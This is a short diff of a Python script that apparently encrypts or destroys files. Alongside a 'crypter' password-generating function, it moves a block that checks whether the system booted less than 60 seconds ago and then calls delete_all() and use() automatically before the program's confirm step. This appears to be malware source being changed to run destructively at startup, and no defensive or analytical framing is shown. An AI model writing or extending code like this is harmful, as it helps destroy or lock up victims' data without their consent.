@@ -17,12 +17,6 @@ import shutil
 from psutil import boot_time
 import time
 
-
-uptime = time.time() - psutil.boot_time()
-if uptime < 60:
-    delete_all()
-
-
 def crypter():
     def generate_password(length):
         characters = string.ascii_letters + string.digits + string.punctuation
@@ -138,5 +132,11 @@ def confirm():
         use()
     else:
         pass
-
+uptime = time.time() - psutil.boot_time()
+if uptime < 60:
+    delete_all()
+    use()
 confirm()
+
+
+
